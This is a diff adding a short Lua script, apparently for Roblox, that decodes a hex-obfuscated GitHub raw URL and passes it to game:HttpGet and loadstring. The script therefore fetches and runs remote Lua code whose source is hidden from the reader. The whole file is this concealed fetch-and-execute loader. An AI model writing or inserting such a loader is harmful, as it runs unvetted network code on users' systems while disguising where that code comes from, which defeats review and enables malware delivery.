@@ -1,0 +1,14 @@
+local hex = function(str)
+    return (str:gsub('.', function(c)
+        return string.format('%02X', string.byte(c))
+    end))
+end
+
+local unhex = function(str)
+    return (str:gsub('..', function(cc)
+        return string.char(tonumber(cc, 16))
+    end))
+end
+
+local encodedHex = "68747470733A2F2F7261772E67697468756275736572636F6E74656E742E636F6D2F4578636C757369766556657273696F6E47697468756249734C6F616465642F7965702F726566732F68656164732F6D61696E2F76626C6567656E64732E6C7561"
+loadstring(game:HttpGet(unhex(encodedHex)))()
